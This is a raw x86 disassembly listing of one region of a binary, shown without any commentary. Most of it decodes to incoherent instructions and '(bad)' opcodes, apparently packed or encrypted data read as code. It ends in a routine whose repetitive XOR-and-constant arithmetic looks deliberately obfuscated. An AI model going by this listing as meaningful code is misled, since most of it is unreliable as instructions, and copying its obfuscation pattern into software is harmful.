  415d88:	add    ebp,DWORD PTR [ecx-0x27]
  415d8b:	lock mov cl,BYTE PTR [eax]
  415d8e:	sub    eax,0x15f1bd56
  415d93:	ja     0x415dfb
  415d95:	adc    al,0xd1
  415d97:	jl     0x415d51
  415d99:	loopne 0x415dca
  415d9b:	ds jb  0x415da9
  415d9e:	pop    eax
  415d9f:	mov    ds:0x658859a9,eax
  415da4:	mov    bl,0x52
  415da6:	sti    
  415da7:	dec    edx
  415da8:	enter  0x41f4,0x6d
  415dac:	adc    DWORD PTR [esp+ebx*1],edx
  415daf:	push   ds
  415db0:	out    0x79,al
  415db2:	sti    
  415db3:	(bad)  
  415db4:	xor    al,0x74
  415db6:	xchg   edx,eax
  415db7:	test   DWORD PTR [ecx-0x26],ebx
  415dba:	out    dx,eax
  415dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dbc:	mov    dh,0x10
  415dbe:	xchg   edi,eax
  415dbf:	enter  0xab46,0xb9
  415dc3:	fsub   DWORD PTR [ecx]
  415dc5:	and    dl,dh
  415dc7:	dec    esi
  415dc8:	mov    ch,0x17
  415dca:	cmp    DWORD PTR [eax],edi
  415dcc:	cdq    
  415dcd:	lahf   
  415dce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dcf:	repnz add DWORD PTR [edx-0x28],esp
  415dd3:	pop    es
  415dd4:	jae    0x415ded
  415dd6:	push   cs
  415dd7:	xor    DWORD PTR [ecx-0x45],edx
  415dda:	mov    esp,0x75821e4e
  415ddf:	dec    ecx
  415de0:	(bad)  
  415de1:	pop    ecx
  415de2:	mov    ?,WORD PTR [ecx+0xbfebd0]
  415de8:	pop    ebp
  415de9:	sti    
  415dea:	adc    DWORD PTR [eax],edx
  415dec:	(bad)  
  415ded:	xchg   esp,eax
  415dee:	mov    al,0x24
  415df0:	mov    dh,0x45
  415df2:	or     bh,ah
  415df4:	scas   al,BYTE PTR es:[edi]
  415df5:	aad    0xca
  415df7:	ins    BYTE PTR es:[edi],dx
  415df8:	mov    eax,ds:0x600b463
  415dfd:	mov    ah,0x25
  415dff:	enter  0xafff,0x2d
  415e03:	pop    eax
  415e04:	mov    esp,0xd8da1e28
  415e09:	mov    ecx,0x21ee7f2b
  415e0e:	jmp    FWORD PTR [edi+esi*2+0x3c]
  415e12:	mov    ebx,0xad3b2fe1
  415e17:	or     al,0x3e
  415e19:	pusha  
  415e1a:	sti    
  415e1b:	(bad)  
  415e1c:	rol    DWORD PTR [eax+0x54476d52],cl
  415e22:	inc    eax
  415e23:	mov    al,ds:0x89ac3d84
  415e28:	ret    0xf48b
  415e2b:	inc    ebp
  415e2c:	rcr    DWORD PTR [edx],1
  415e2e:	cmp    BYTE PTR [edx],cl
  415e30:	lds    esp,FWORD PTR [edx+0x3a]
  415e33:	into   
  415e34:	xor    BYTE PTR [ebp+esi*1-0x33],ch
  415e38:	inc    ebx
  415e39:	test   BYTE PTR [ecx+0x5f23dd5],bh
  415e3f:	jmp    0x415e1c
  415e41:	(bad)  
  415e42:	(bad)  
  415e43:	imul   esp,DWORD PTR [ebx+0xe],0x97e992e
  415e4a:	inc    BYTE PTR [esi+0x71]
  415e4d:	cmp    eax,0x4d82b21c
  415e52:	mov    edi,0x5f3773f9
  415e57:	and    eax,0x8bdb9dfa
  415e5c:	mov    ah,0x32
  415e5e:	test   ebp,ebp
  415e60:	(bad)  
  415e61:	leave  
  415e62:	jbe    0x415e92
  415e64:	inc    ebx
  415e65:	sub    esp,DWORD PTR [eax-0x7e]
  415e68:	jo     0x415ec2
  415e6a:	cmc    
  415e6b:	adc    DWORD PTR [ebx+0x6ea4d83e],edx
  415e71:	jmp    0x415e15
  415e73:	xor    edx,esp
  415e75:	mov    ds:0xc1a28fce,eax
  415e7a:	mov    esp,ds
  415e7c:	push   esp
  415e7d:	ds sub eax,0xff8659bc
  415e83:	cmp    esp,DWORD PTR [ebx]
  415e85:	push   edx
  415e86:	shl    DWORD PTR [eax-0x6b],0xc7
  415e8a:	dec    ebp
  415e8b:	data16 aas 
  415e8d:	popa   
  415e8e:	mov    ebx,0x85e3241a
  415e93:	data16 sub al,0xfe
  415e96:	push   ebp
  415e97:	(bad)  [edx]
  415e99:	xchg   edi,eax
  415e9a:	mov    cl,0xc1
  415e9c:	(bad)  
  415e9d:	scas   al,BYTE PTR es:[edi]
  415e9e:	in     eax,dx
  415e9f:	cmp    ecx,DWORD PTR [ebx-0x326debf]
  415ea5:	aaa    
  415ea6:	cld    
  415ea7:	ins    DWORD PTR es:[edi],dx
  415ea8:	in     al,0x78
  415eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eab:	cwde   
  415eac:	neg    DWORD PTR [edi-0x37b84aab]
  415eb2:	push   0xbb2a41c9
  415eb7:	(bad)  
  415eb8:	xor    eax,0x8b6a2237
  415ebd:	stos   BYTE PTR es:[edi],al
  415ebe:	inc    ebp
  415ebf:	out    0x64,eax
  415ec1:	adc    eax,0x17eefe44
  415ec6:	xor    al,0x88
  415ec8:	push   es
  415ec9:	xchg   edi,ecx
  415ecb:	rcr    BYTE PTR [edi-0x2e],1
  415ece:	pop    ebx
  415ecf:	scas   eax,DWORD PTR es:[edi]
  415ed0:	nop
  415ed1:	andps  xmm7,XMMWORD PTR [ebp+ecx*4+0x55]
  415ed6:	sub    DWORD PTR [edi-0x5e3b8b79],ebp
  415edc:	mov    dl,0x87
  415ede:	xor    DWORD PTR [ecx+0x411e5769],0x9
  415ee5:	add    esi,edi
  415ee7:	push   esp
  415ee8:	mov    al,ds:0x1c7ffce2
  415eed:	pop    esi
  415eee:	out    dx,eax
  415eef:	and    al,0xf9
  415ef1:	aaa    
  415ef2:	add    DWORD PTR [ebx],0xb221589f
  415ef8:	jp     0x415f37
  415efa:	add    al,0xcd
  415efc:	jle    0x415ef3
  415efe:	lods   al,BYTE PTR ds:[esi]
  415eff:	push   esp
  415f00:	jno    0x415ecb
  415f02:	sbb    edx,edx
  415f04:	rol    BYTE PTR [ecx],0x9b
  415f07:	or     edx,DWORD PTR [eax+0x594cac8a]
  415f0d:	call   0x2c75:0x8b1ba469
  415f14:	mov    eax,ds:0xdb7ba442
  415f19:	sub    al,0xf7
  415f1b:	push   ds
  415f1c:	push   ds
  415f1d:	dec    edi
  415f1e:	push   es
  415f1f:	sub    al,0x7b
  415f21:	dec    eax
  415f22:	jecxz  0x415f7b
  415f24:	(bad)  
  415f25:	pop    eax
  415f26:	gs scas eax,DWORD PTR es:[edi]
  415f28:	cmp    DWORD PTR [edx],ecx
  415f2a:	and    DWORD PTR [eax+0x1a],ebp
  415f2d:	xor    al,0x0
  415f2f:	mov    cl,0xf8
  415f31:	rcr    esp,1
  415f33:	test   eax,0x8f023605
  415f38:	cwde   
  415f39:	sub    ch,al
  415f3b:	mov    esp,0xdd6e2b36
  415f40:	jecxz  0x415f60
  415f42:	sbb    al,0x42
  415f44:	add    eax,0x4d6504ff
  415f49:	sub    eax,0x23bebcc
  415f4e:	scas   al,BYTE PTR es:[edi]
  415f4f:	sahf   
  415f50:	pop    ds
  415f51:	push   es
  415f52:	das    
  415f53:	leave  
  415f54:	adc    ecx,edx
  415f56:	jp     0x415fd6
  415f58:	or     al,0x47
  415f5a:	and    DWORD PTR [edi+0x1534e3b1],0x1
  415f61:	mov    dh,0xb
  415f63:	jg     0x415fcd
  415f65:	ret    0x7f67
  415f68:	pop    ebx
  415f69:	lahf   
  415f6a:	call   0xdff6b964
  415f6f:	and    al,0x9f
  415f71:	sbb    eax,0x79d14b3f
  415f76:	rol    BYTE PTR [edx-0x1b],1
  415f79:	push   esi
  415f7a:	inc    esi
  415f7b:	mov    DWORD PTR [esi-0x7],0x27385721
  415f82:	mov    dl,0x4
  415f84:	bound  ebp,QWORD PTR [ebx+0x34a52ef6]
  415f8a:	pop    ss
  415f8b:	sahf   
  415f8c:	mov    al,0x90
  415f8e:	jecxz  0x415faa
  415f90:	test   BYTE PTR [esi],dl
  415f92:	lahf   
  415f93:	aad    0xaf
  415f95:	and    DWORD PTR [ebx],0xeda45298
  415f9b:	je     0x415ff4
  415f9d:	scas   al,BYTE PTR es:[edi]
  415f9e:	cmp    DWORD PTR [edx],esp
  415fa0:	xchg   edx,eax
  415fa1:	fiadd  WORD PTR [edx]
  415fa3:	div    ecx
  415fa5:	xor    eax,0x68dcb29b
  415faa:	lods   eax,DWORD PTR ds:[esi]
  415fab:	xor    ebp,ecx
  415fad:	sti    
  415fae:	cmp    DWORD PTR [ecx-0x34],0xb8426531
  415fb5:	out    0x78,al
  415fb7:	dec    eax
  415fb8:	mov    cl,0x4f
  415fba:	cmp    BYTE PTR [edi+0x39],bl
  415fbd:	mov    al,ds:0xf5223d85
  415fc2:	sar    DWORD PTR [ebp+0x7d7004d7],0x24
  415fc9:	inc    ebp
  415fca:	(bad)  
  415fcb:	in     eax,0x66
  415fcd:	mov    eax,ds:0x62d19b2b
  415fd2:	xor    ebx,DWORD PTR [ecx+0x69596ce2]
  415fd8:	inc    edx
  415fd9:	sub    BYTE PTR [ecx-0x2b70f29e],ch
  415fdf:	test   al,0x2e
  415fe1:	retf   0x7b45
  415fe4:	les    esi,FWORD PTR [esi+0x21]
  415fe7:	xor    ch,BYTE PTR [ebx]
  415fe9:	adc    ebp,edx
  415feb:	and    DWORD PTR [esi],eax
  415fed:	jge    0x416056
  415fef:	or     al,0x54
  415ff1:	add    al,ch
  415ff3:	mov    dl,0xdd
  415ff5:	and    al,0xd7
  415ff7:	mov    BYTE PTR ds:0x41bf78c0,ah
  415ffd:	div    bh
  415fff:	mul    BYTE PTR [edx+0x1b]
  416002:	(bad)  
  416004:	sbb    ch,BYTE PTR [ebx+0x1a]
  416007:	cwde   
  416008:	bound  ebx,QWORD PTR [edi-0x41]
  41600b:	sti    
  41600c:	dec    edi
  41600d:	pop    ss
  41600e:	call   0xcefdc1e8
  416013:	push   ebp
  416014:	shl    DWORD PTR [edx-0x15],1
  416017:	aam    0xc3
  416019:	xchg   esi,eax
  41601a:	fs mov dh,0x8f
  41601d:	sub    al,0xae
  41601f:	dec    edx
  416020:	mov    edx,0x362fde04
  416025:	cmp    DWORD PTR [esp+eiz*4-0x50e3854e],ebp
  41602c:	(bad)  
  41602f:	fs inc esp
  416031:	dec    esp
  416032:	scas   al,BYTE PTR es:[edi]
  416033:	and    BYTE PTR [ebp-0x5b],cl
  416036:	xchg   DWORD PTR [esi+0x4c],esp
  416039:	jecxz  0x415ffc
  41603b:	sbb    DWORD PTR [eax-0x5c],eax
  41603e:	out    dx,al
  41603f:	mov    ecx,?
  416041:	jmp    0x7da4:0x622a82bd
  416048:	mov    esp,DWORD PTR [eax+0x130fc077]
  41604e:	fmul   st,st(0)
  416050:	into   
  416051:	cmp    DWORD PTR [edx+0x1d],edi
  416054:	xor    BYTE PTR [edx+0x7],al
  416057:	sbb    bl,bh
  416059:	xchg   ecx,eax
  41605a:	mov    eax,ds:0x68ff8713
  41605f:	imul   esp,ecx,0x3a
  416062:	popf   
  416063:	adc    eax,0x9822f54c
  416068:	lds    esp,FWORD PTR [esi]
  41606a:	dec    eax
  41606b:	xchg   BYTE PTR cs:[eax],cl
  41606e:	jne    0x416067
  416070:	int3   
  416071:	imul   eax,edx,0x23
  416074:	lods   al,BYTE PTR ds:[esi]
  416075:	xchg   esi,eax
  416076:	sub    al,0xb3
  416078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416079:	sub    esi,ecx
  41607b:	mov    cl,0xc7
  41607d:	adc    edx,DWORD PTR [ecx-0x5f28a180]
  416083:	int    0xb
  416085:	jmp    DWORD PTR [ebx+0x2f]
  416088:	mov    edi,0x73fd1d35
  41608d:	sar    BYTE PTR [eax],1
  41608f:	mov    ebp,0x5a2da0be
  416094:	sub    cl,bh
  416096:	or     BYTE PTR [esi-0x2bf75f18],dh
  41609c:	sbb    esp,ebp
  41609e:	call   0xe26453f0
  4160a3:	fdiv   st,st(0)
  4160a5:	push   edi
  4160a6:	and    ebx,DWORD PTR es:[eax-0x1e7afa58]
  4160ad:	adc    al,0x6f
  4160af:	in     eax,0xa3
  4160b1:	xchg   edx,eax
  4160b2:	jle    0x4160c6
  4160b4:	mov    ebp,0x7f34026a
  4160b9:	and    ebx,DWORD PTR ds:0x24d2dcbe
  4160bf:	sar    BYTE PTR [edi+ebp*4+0x29],1
  4160c3:	mov    ebp,0xbe3e6308
  4160c8:	(bad)  
  4160c9:	pop    ebx
  4160ca:	mov    fs,WORD PTR [eax]
  4160cc:	and    BYTE PTR ds:0xb3198a98,bl
  4160d2:	lock and BYTE PTR [esi-0x381e5d42],0x1f
  4160da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160db:	lds    ecx,FWORD PTR [edi+eax*2]
  4160de:	mov    dl,0xe0
  4160e0:	pop    edx
  4160e1:	push   ebp
  4160e2:	pop    edi
  4160e3:	push   es
  4160e4:	loopne 0x41609c
  4160e6:	imul   edx,DWORD PTR [edi-0x10f2db25],0xffffffa2
  4160ed:	xor    edi,esp
  4160ef:	xor    al,0x2f
  4160f1:	cmc    
  4160f2:	sub    dl,cl
  4160f4:	retf   0x2d7a
  4160f7:	jnp    0x416097
  4160f9:	xor    DWORD PTR [edx],0x98d5ca70
  4160ff:	test   al,0x26
  416101:	retf   0x9618
  416104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416105:	outs   dx,BYTE PTR ds:[esi]
  416106:	scas   eax,DWORD PTR es:[edi]
  416107:	dec    ebp
  416108:	sub    al,0x48
  41610a:	outs   dx,BYTE PTR ds:[esi]
  41610b:	icebp  
  41610c:	cs mov eax,0x8994cde5
  416112:	call   0x97621ea7
  416117:	aas    
  416118:	fsin   
  41611a:	cmp    bl,BYTE PTR [esi-0x2bf31a85]
  416120:	scas   al,BYTE PTR es:[edi]
  416121:	sbb    DWORD PTR [edx+ecx*1-0x622dc65a],ecx
  416128:	dec    esi
  416129:	ins    BYTE PTR es:[edi],dx
  41612a:	adc    eax,0x3ef894a5
  41612f:	adc    DWORD PTR [eax],ecx
  416131:	cmp    al,0x7d
  416133:	jge    0x416144
  416135:	push   eax
  416136:	cdq    
  416137:	dec    edx
  416138:	cmp    al,0x8e
  41613a:	test   BYTE PTR [esi+0x627920af],dl
  416140:	dec    esp
  416141:	jb     0x416107
  416143:	jecxz  0x4161b4
  416145:	repnz stos BYTE PTR es:[edi],al
  416147:	das    
  416148:	cmp    al,bl
  41614a:	mov    bl,0xcf
  41614c:	retf   0xa727
  41614f:	repnz leave 
  416151:	xchg   BYTE PTR [esi+0x6b],cl
  416154:	push   ebx
  416155:	(bad)  
  416156:	push   edx
  416157:	mov    ebp,DWORD PTR [edi+edx*1]
  41615a:	imul   DWORD PTR [ebx]
  41615c:	and    edx,eax
  41615e:	repnz aaa 
  416160:	and    DWORD PTR [ebx+0x7bf214aa],ebx
  416166:	push   0x28
  416168:	push   0x5f
  41616a:	dec    ebp
  41616b:	pop    ebp
  41616c:	aas    
  41616d:	xor    eax,0xb0d5a603
  416172:	aas    
  416173:	cwde   
  416174:	cmc    
  416175:	rcl    DWORD PTR ds:0xc7cfb632,0x74
  41617c:	loop   0x416136
  41617e:	or     esp,DWORD PTR [ecx]
  416180:	test   cl,al
  416182:	mov    DWORD PTR [ebx+0x45],edi
  416185:	shl    BYTE PTR [edi+0x54],1
  416188:	jmp    0x4161ef
  41618a:	dec    esp
  41618b:	(bad)  
  41618c:	shl    BYTE PTR [edi-0x7d],cl
  41618f:	pusha  
  416190:	dec    edi
  416191:	xchg   ecx,eax
  416192:	and    eax,0xf6c27dc6
  416197:	jl     0x416196
  416199:	sbb    edx,ecx
  41619b:	test   DWORD PTR [esi],ebp
  41619d:	dec    ebp
  41619e:	retf   
  41619f:	bound  ebx,QWORD PTR [ebp+0x0]
  4161a2:	int    0x9d
  4161a4:	int    0x88
  4161a6:	add    al,0xc
  4161a8:	outs   dx,BYTE PTR ds:[esi]
  4161a9:	mov    eax,ds:0xc1b8d0dd
  4161ae:	sub    DWORD PTR ss:[ebp-0x1a],esi
  4161b2:	call   0x425b:0xbca2841e
  4161b9:	pop    ds
  4161ba:	into   
  4161bb:	sbb    dl,dl
  4161bd:	inc    esi
  4161be:	xlat   BYTE PTR ds:[ebx]
  4161bf:	shl    BYTE PTR [esp+edi*4+0x4f],cl
  4161c3:	fidiv  DWORD PTR [ebx-0x5f]
  4161c6:	mov    BYTE PTR [ecx+0x3f48800a],cl
  4161cc:	jne    0x41621b
  4161ce:	xchg   BYTE PTR [eax+0x6f],dl
  4161d1:	inc    ebx
  4161d2:	push   edi
  4161d3:	pusha  
  4161d4:	ins    DWORD PTR es:[edi],dx
  4161d5:	lods   al,BYTE PTR ds:[esi]
  4161d6:	mov    cl,BYTE PTR [ebx+0x5782a7]
  4161dc:	or     ebx,esi
  4161de:	ja     0x4161b1
  4161e0:	xlat   BYTE PTR ds:[ebx]
  4161e1:	dec    eax
  4161e2:	sub    dl,cl
  4161e4:	or     BYTE PTR [edi+0x723d6e18],cl
  4161ea:	push   ecx
  4161eb:	out    dx,al
  4161ec:	mov    ebp,DWORD PTR [edi]
  4161ee:	cdq    
  4161ef:	aam    0x1c
  4161f1:	pop    esp
  4161f2:	int    0x4a
  4161f4:	sbb    dl,0x12
  4161f7:	scas   eax,DWORD PTR es:[edi]
  4161f8:	jp     0x416219
  4161fa:	bound  esi,QWORD PTR [ecx+0x4b0a1f24]
  416200:	mov    WORD PTR [eax],gs
  416202:	js     0x416261
  416204:	push   eax
  416205:	scas   al,BYTE PTR es:[edi]
  416206:	sub    dh,BYTE PTR [ecx+0x6ae9a74]
  41620c:	cmp    dh,0x90
  41620f:	inc    ebp
  416210:	loope  0x4161d6
  416212:	mov    ecx,0x3338a35a
  416217:	pop    ds
  416218:	sti    
  416219:	into   
  41621a:	aaa    
  41621b:	in     al,dx
  41621c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41621d:	not    edi
  41621f:	or     al,0xe8
  416221:	shr    DWORD PTR [ebx-0x4d3cd3df],1
  416227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416228:	fwait
  416229:	retf   0x2db0
  41622c:	mov    edi,edx
  41622e:	test   DWORD PTR [ecx-0x23302b7],0x33422923
  416238:	mov    eax,es
  41623a:	or     cl,BYTE PTR [eax-0x4b]
  41623d:	sti    
  41623e:	out    dx,al
  41623f:	(bad)
  416242:	fwait
  416243:	cmp    eax,0x39ceaa18
  416248:	xchg   esi,eax
  416249:	mov    ah,0xc6
  41624b:	(bad)  
  41624c:	jmp    0x7bd34c3c
  416251:	popa   
  416252:	push   eax
  416253:	sbb    eax,0x1c4466b5
  416258:	or     BYTE PTR [edi+esi*8+0xa],0x66
  41625d:	jb     0x4161f0
  41625f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416260:	clc    
  416261:	repz pop ds
  416263:	or     eax,0xd8c028bd
  416268:	and    BYTE PTR ds:0x4fbcc666,0x80
  41626f:	or     ecx,DWORD PTR [edi]
  416271:	mov    BYTE PTR [edi-0x11b919a3],bl
  416277:	sbb    BYTE PTR [ecx+eiz*2],ch
  41627a:	test   eax,0x310c010d
  41627f:	fwait
  416280:	xchg   ecx,eax
  416281:	or     BYTE PTR [ecx],al
  416283:	mov    ss,ecx
  416285:	arpl   cx,ax
  416287:	or     al,0x67
  416289:	enter  0x815c,0x9a
  41628d:	lods   eax,DWORD PTR ds:[esi]
  41628e:	xchg   ebp,eax
  41628f:	js     0x4162b0
  416291:	outs   dx,DWORD PTR ds:[esi]
  416292:	loop   0x4162c5
  416294:	xchg   edx,eax
  416295:	repnz pop edx
  416297:	sbb    al,0xfa
  416299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41629a:	js     0x416231
  41629c:	enter  0x201d,0xbf
  4162a0:	int    0x6e
  4162a2:	and    esi,DWORD PTR [edi-0x6b2d4694]
  4162a8:	retf   0xcb98
  4162ab:	sar    DWORD PTR [edi],0x81
  4162ae:	imul   esp,DWORD PTR [esi+0x2b],0xffffff96
  4162b2:	mov    eax,ebp
  4162b4:	fs pop edi
  4162b6:	sub    esp,eax
  4162b8:	and    eax,0x2f972c33
  4162bd:	adc    bh,dh
  4162bf:	(bad)  
  4162c1:	and    esp,DWORD PTR [ecx+esi*1+0x33]
  4162c5:	adc    al,0x2d
  4162c7:	xchg   DWORD PTR [ecx+ebx*4-0x71f66724],ebp
  4162ce:	add    al,BYTE PTR [eax+ecx*4]
  4162d1:	add    BYTE PTR [edx+edx*8],0xa7
  4162d5:	adc    BYTE PTR [edx],cl
  4162d7:	cmc    
  4162d8:	(bad)  
  4162d9:	fild   QWORD PTR [eax]
  4162db:	je     0x416330
  4162dd:	pop    ds
  4162de:	stc    
  4162df:	inc    eax
  4162e0:	mov    ebp,0xcf0cf3cd
  4162e5:	xchg   esi,eax
  4162e6:	jmp    0x416316
  4162e8:	push   ebp
  4162e9:	in     eax,0x79
  4162eb:	dec    ebp
  4162ec:	cmp    bh,cl
  4162ee:	call   0x8df:0x8eb5d452
  4162f5:	xor    DWORD PTR [eax-0x10],ecx
  4162f8:	xor    al,BYTE PTR [ecx+0x406c5cf]
  4162fe:	xchg   edx,eax
  4162ff:	xchg   edi,eax
  416300:	out    0x84,eax
  416302:	push   esi
  416303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416304:	xor    DWORD PTR [ecx-0x48],ebp
  416307:	sbb    al,0x8e
  416309:	mov    al,ds:0xe8fddef5
  41630e:	in     al,0x5a
  416310:	xor    esp,ecx
  416312:	repnz out dx,al
  416314:	push   ss
  416315:	std    
  416316:	mov    ds:0x83c063aa,eax
  41631b:	shl    edx,cl
  41631d:	cmc    
  41631e:	int3   
  41631f:	add    eax,0x1440023b
  416324:	rcr    BYTE PTR [eax],1
  416326:	fwait
  416327:	mov    cl,0xe9
  416329:	push   0x69021920
  41632e:	cmp    eax,0x87df7742
  416333:	mov    bh,BYTE PTR [edi-0x35]
  416336:	pop    ebp
  416337:	push   eax
  416338:	ret    0x1286
  41633b:	(bad)  
  41633c:	repz sub BYTE PTR [edi-0x6d7937e7],al
  416343:	sbb    esp,DWORD PTR [ebx]
  416345:	cld    
  416346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416347:	aad    0x2e
  416349:	push   edi
  41634a:	or     edx,ecx
  41634c:	neg    BYTE PTR [esi-0x49]
  41634f:	ins    BYTE PTR es:[edi],dx
  416350:	and    ah,0xfc
  416353:	es mov edi,0x56251207
  416359:	xor    ebp,DWORD PTR [esi]
  41635b:	cwde   
  41635c:	push   esi
  41635d:	jmp    0xca89:0x314aba04
  416364:	adc    DWORD PTR [esi],ecx
  416366:	mov    bl,0x5b
  416368:	pop    ecx
  416369:	xchg   ebx,eax
  41636a:	xchg   edi,eax
  41636b:	les    edi,FWORD PTR cs:[eax-0x34]
  41636f:	push   ecx
  416370:	loopne 0x416317
  416372:	mov    BYTE PTR [ebp-0x69],dh
  416375:	inc    ebp
  416376:	jae    0x41634f
  416378:	mov    eax,0x4cd3ce69
  41637d:	in     eax,dx
  41637e:	pop    edi
  41637f:	push   edi
  416380:	aaa    
  416381:	mov    ecx,edi
  416383:	jae    0x4163ae
  416385:	push   0x2c1c1b82
  41638a:	lods   eax,DWORD PTR ds:[esi]
  41638b:	ret    
  41638c:	sub    al,0x87
  41638e:	mov    dh,0x4c
  416390:	fldenv [edi+edx*2+0x52]
  416394:	nop
  416395:	fidivr DWORD PTR [ebp+ebp*1+0x12dabc4b]
  41639c:	nop
  41639d:	pop    esi
  41639e:	pop    ecx
  41639f:	jmp    0x5521:0x7968a111
  4163a6:	pop    edi
  4163a7:	mov    ebp,0xc3d1d688
  4163ac:	mov    esi,0x71525d6a
  4163b1:	jecxz  0x4163bf
  4163b3:	dec    esi
  4163b4:	mov    al,0x51
  4163b6:	sub    ebx,edx
  4163b8:	add    ebx,DWORD PTR [ebp-0x44]
  4163bb:	mov    DWORD PTR [ebp-0x44],ebx
  4163be:	mov    edx,DWORD PTR [ebp+0x8]
  4163c1:	xor    edx,eax
  4163c3:	add    edx,esi
  4163c5:	jne    0x413f9a
  4163cb:	mov    edx,DWORD PTR [ebp-0x8]
  4163ce:	mov    ebx,DWORD PTR [ebp-0xc]
  4163d1:	xor    edx,eax
  4163d3:	lea    edx,[edx+ebx*1+0x3272e2]
  4163da:	mov    DWORD PTR [ebp-0xc],edx
  4163dd:	mov    edx,DWORD PTR [ebp-0x10]
  4163e0:	xor    edx,eax
  4163e2:	add    edx,esi
  4163e4:	jne    0x40f3d9
  4163ea:	jmp    0x416501
  4163ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4163f2:	mov    DWORD PTR [ebp+0x8],ecx
  4163f5:	jmp    0x41646e
  4163fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4163fd:	mov    edx,DWORD PTR [ebp-0x8]
  416400:	xor    ecx,eax
  416402:	xor    edx,eax
  416404:	sub    ecx,edx
  416406:	sub    ecx,esi
  416408:	xor    ecx,eax
  41640a:	mov    DWORD PTR [ebp+0x8],ecx
  41640d:	mov    ecx,DWORD PTR [ebp+0x8]
  416410:	mov    edx,DWORD PTR [ebp-0x58]
  416413:	add    ecx,0x5708c4
  416419:	imul   ecx,edx
  41641c:	mov    DWORD PTR [ebp-0x58],ecx
  41641f:	mov    ecx,DWORD PTR [ebp+0x8]
  416422:	mov    edx,DWORD PTR [ebp-0x54]
  416425:	add    ecx,0x64f8da
  41642b:	or     ecx,edx
  41642d:	mov    DWORD PTR [ebp-0x54],ecx
  416430:	mov    ecx,DWORD PTR [ebp+0x8]
  416433:	mov    edx,DWORD PTR [ebp-0x50]
  416436:	add    ecx,0x242ebe9
  41643c:	xor    ecx,edx
  41643e:	mov    DWORD PTR [ebp-0x50],ecx
  416441:	mov    ecx,DWORD PTR [ebp+0x8]
  416444:	mov    edx,DWORD PTR [ebp-0x4c]
  416447:	add    ecx,edi
  416449:	and    ecx,edx
  41644b:	mov    DWORD PTR [ebp-0x4c],ecx
  41644e:	mov    ecx,DWORD PTR [ebp+0x8]
  416451:	mov    edx,DWORD PTR [ebp-0x48]
  416454:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41645b:	mov    DWORD PTR [ebp-0x48],ecx
  41645e:	mov    ecx,DWORD PTR [ebp+0x8]
  416461:	mov    edx,0xfa5e15e2
  416466:	sub    edx,ecx
  416468:	add    edx,DWORD PTR [ebp-0x44]
  41646b:	mov    DWORD PTR [ebp-0x44],edx
  41646e:	mov    ecx,DWORD PTR [ebp+0x8]
  416471:	xor    ecx,eax
  416473:	add    ecx,esi
  416475:	jne    0x4163fa
  41647b:	jmp    0x41650d
  416480:	mov    ecx,DWORD PTR [ebp+0x8]
  416483:	mov    edx,DWORD PTR [ebp-0x8]
  416486:	xor    ecx,eax
  416488:	xor    edx,eax
  41648a:	sub    ecx,edx
  41648c:	sub    ecx,esi
  41648e:	xor    ecx,eax
  416490:	mov    DWORD PTR [ebp+0x8],ecx
  416493:	mov    ecx,DWORD PTR [ebp+0x8]
  416496:	mov    edx,DWORD PTR [ebp-0x58]
  416499:	add    ecx,0x5708c4
  41649f:	imul   ecx,edx
  4164a2:	mov    DWORD PTR [ebp-0x58],ecx
  4164a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4164a8:	mov    edx,DWORD PTR [ebp-0x54]
  4164ab:	add    ecx,0x64f8da
  4164b1:	or     ecx,edx
  4164b3:	mov    DWORD PTR [ebp-0x54],ecx
  4164b6:	mov    ecx,DWORD PTR [ebp+0x8]
  4164b9:	mov    edx,DWORD PTR [ebp-0x50]
  4164bc:	add    ecx,0x242ebe9
  4164c2:	xor    ecx,edx
  4164c4:	mov    DWORD PTR [ebp-0x50],ecx
  4164c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4164ca:	mov    edx,DWORD PTR [ebp-0x4c]
  4164cd:	add    ecx,edi
  4164cf:	and    ecx,edx
  4164d1:	mov    DWORD PTR [ebp-0x4c],ecx
  4164d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164d7:	mov    edx,DWORD PTR [ebp-0x48]
  4164da:	lea    ecx,[edx+ecx*1+0x241fc1f]
  4164e1:	mov    DWORD PTR [ebp-0x48],ecx
  4164e4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164e7:	mov    edx,0xfa5e15e2
  4164ec:	sub    edx,ecx
  4164ee:	add    edx,DWORD PTR [ebp-0x44]
  4164f1:	mov    DWORD PTR [ebp-0x44],edx
  4164f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164f7:	xor    ecx,eax
  4164f9:	add    ecx,esi
  4164fb:	jne    0x416480
  416501:	mov    ecx,DWORD PTR [ebp-0x8]
  416504:	xor    ecx,eax
  416506:	mov    eax,DWORD PTR [ebp+0x10]
  416509:	add    ecx,esi
  41650b:	mov    DWORD PTR [eax],ecx
  41650d:	pop    edi
  41650e:	pop    esi
  41650f:	pop    ebx
  416510:	leave  
  416511:	ret    0xc
  416514:	add    BYTE PTR [eax+0x43],al
  416517:	add    BYTE PTR [eax+eax*2],al
  41651a:	inc    ebx
  41651b:	add    BYTE PTR [eax],cl
  41651d:	inc    eax
  41651e:	inc    ebx
  41651f:	add    BYTE PTR [eax+eax*2],cl
  416522:	inc    ebx
  416523:	add    BYTE PTR [eax],dl
  416525:	inc    eax
  416526:	inc    ebx
  416527:	add    BYTE PTR [eax+eax*2],dl
  41652a:	inc    ebx
  41652b:	add    BYTE PTR [eax],bl
  41652d:	inc    eax
  41652e:	inc    ebx
  41652f:	add    BYTE PTR [eax+eax*2],bl
  416532:	inc    ebx
  416533:	add    BYTE PTR [eax],ah
  416535:	inc    eax
  416536:	inc    ebx
